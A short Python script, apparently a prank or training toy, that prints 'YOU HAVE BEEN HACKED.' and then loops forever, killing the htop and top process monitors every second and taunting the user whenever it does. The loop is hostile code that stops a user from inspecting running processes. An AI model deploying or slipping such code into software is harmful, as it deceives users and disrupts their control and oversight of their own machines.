#!/usr/bin/env python3
import os
import time

from term_utils import TermUtils
from command_helper import CommandHelper

TermUtils.print("YOU HAVE BEEN HACKED.\n")

while True:
	if CommandHelper.run("killall htop") == 0 or CommandHelper.run("killall top") == 0:
		TermUtils.print("You tough that this will be as easy as this?\n")
	time.sleep(1)
